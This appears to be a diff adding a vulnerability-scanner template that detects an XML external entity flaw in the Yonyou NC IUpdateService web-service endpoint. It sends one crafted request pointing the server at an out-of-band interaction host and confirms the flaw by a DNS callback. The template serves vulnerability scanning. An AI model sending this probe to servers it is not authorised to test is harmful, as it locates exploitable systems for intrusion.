@@ -1,0 +1,21 @@
+
+id: yonyou-nc-iupdateservice-xxe-2
+
+info:
+  name: "用友 NC IUpdateService 接口 XML 外部实体注入漏洞"
+  author: qwtd
+  severity: medium
+  tags: Yongyou-NC-Cloud,Yonyou-UFIDA-NC
+
+requests:
+  - raw:
+      - |
+        GET /uapws/service/nc.uap.oba.update.IUpdateService?xsd=http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
